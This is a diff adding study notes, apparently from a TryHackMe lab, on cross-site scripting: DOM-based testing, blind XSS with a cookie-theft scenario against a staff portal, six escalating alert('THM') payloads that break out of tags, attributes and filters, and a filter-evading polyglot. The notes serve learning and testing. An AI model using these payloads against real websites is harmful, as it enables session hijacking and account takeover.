@@ -79,3 +79,70 @@
 **How to test for Dom Based?**
 - DOM Based can be challenging to test for and requires a certain amount of knowledge of JavaScript to read the source code. You'd need to look for parts of the code that access certain variables that an attacker can have control over, such as "window.location.x" parameters.
 - When you've found those bits of code, you'd then need to see how they are handled and whether the values are ever written to the web page's DOM or passed to unsafe JavaScript methods such as eval().
+
+
+## Blind XSS
+- It is similar to a stored XSS
+- You can't see the payload working or be able to test it against yourself first
+
+- **Example**
+    - A website has a contact form where you can message a member of staff. The message content doesn't get checked for any malicious code, which allows the attacker to enter anything they wish. These messages then get turned into support tickets which staff view on a private web portal. 
+
+**Potential Impact**
+- Make calls back to an attacker's website, revealing the staff portal URL, the staff member's cookies, and even the contents of the portal page that is being viewed. Now the attacker could potentially hijack the staff member's session and have access to the private portal. 
+
+
+- When testing for Blind vulnerabilities, you need to ensure your payload has a call back (usually an HTTP request)
+
+
+## Perfecting your payload
+1. **Level 1**
+    ```
+    <script>alert('THM');</script>
+    ```
+
+    ![Screenshot](/images/level1.png)
+
+2. **Level 2**
+    ```
+    "><script>alert('THM');</script>
+    ```
+
+    ![Screenshot](/images/level2.png)
+
+3. **Level 3**
+    ```
+    </textarea><script>alert('THM');</script>
+    ```
+
+    ![Screenshot](/images/level3.png)
+
+4. **Level 4**
+    ```
+    ';alert('THM');//
+    ```
+
+    ![Screenshot](/images/level4.png)
+
+5. **Level 5**
+    ```
+    <sscriptcript>alert('THM');</sscriptcript>
+    ```
+
+    ![Screenshot](/images/level5.png)
+
+6. **Level 6**
+    ```
+    /images/cat.jpg" onload="alert('THM');
+    ```
+
+    ![Screenshot](/images/level6.png)
+
+
+## Polyglots
+- An XSS polyglot is a string of text which can escape attributes, tags and bypass filters all in one
+- Simple example
+    ```
+    /*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('THM')//>\x3e
+    ```
+    
